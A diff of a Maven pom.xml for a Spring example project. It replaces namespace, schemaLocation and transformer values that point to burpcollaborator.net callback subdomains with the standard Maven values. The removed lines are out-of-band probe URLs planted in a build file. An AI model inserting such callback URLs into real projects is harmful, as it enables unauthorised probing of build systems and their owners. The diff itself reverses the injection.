@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<project xmlns="http://alpha.v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net" xmlns:xsi="http://bravo.v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net"
-    xsi:schemaLocation="http://charlie.v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net"/>
-	<modelVersion>4.0.0</modelVersion>
+<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+    xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
+    <modelVersion>4.0.0</modelVersion>
 	
 	<groupId>org.springframework</groupId>
 	<artifactId>gs-maven</artifactId>
@@ -67,8 +67,8 @@
 						</goals>
 						<configuration>
 							<transformers>
-								<transformer implementation="http://echo.v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/">
-									<mainClass>hello.HelloWorld</mainClass>
+                                <transformer implementation="org.apache.maven.plugins.shade.resource.ManifestResourceTransformer">
+                                    <mainClass>hello.HelloWorld</mainClass>
 								</transformer>
 							</transformers>
 						</configuration>
